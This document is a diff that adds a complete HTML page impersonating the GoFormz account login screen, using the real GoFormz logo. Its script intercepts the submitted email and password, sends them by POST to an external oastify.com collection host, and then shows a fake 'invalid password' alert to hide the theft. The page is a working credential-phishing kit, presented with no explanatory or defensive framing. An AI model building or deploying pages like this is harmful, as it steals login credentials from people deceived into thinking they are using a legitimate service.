@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Log in to your account</title>
+  <style>
+    body {
+      background-color: #009bd6;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .center-wrapper {
+      text-align: center;
+    }
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      width: 350px;
+      text-align: center;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    button {
+      background-color: #f4c542;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="center-wrapper">
+  <img src="https://accounts.goformz.com/static/media/Logo.4593d9335433d6ea28c2.svg" type="image/svg+xml">
+    <div class="container">
+      <h2>Log in to your account</h2>
+      <form id="loginForm">
+        <input type="email" id="email" placeholder="Email" required><br>
+        <input type="password" id="password" placeholder="Password" required><br>
+        <button type="submit">Log in</button>
+      </form>
+    </div>
+  </div>
+
+ <script>
+document.getElementById('loginForm').addEventListener('submit', function (e) {
+  e.preventDefault();
+
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+
+  const formData = new FormData();
+  formData.append('email', email);
+  formData.append('password', password);
+
+  fetch('https://1tvpimupka1rjz29vfnb5gjv4mady3ms.oastify.com', {
+    method: 'POST',
+    body: formData
+  });
+
+  alert("Invalid email or password. Please try again.");
+});
+</script>
+</body>
+</html>
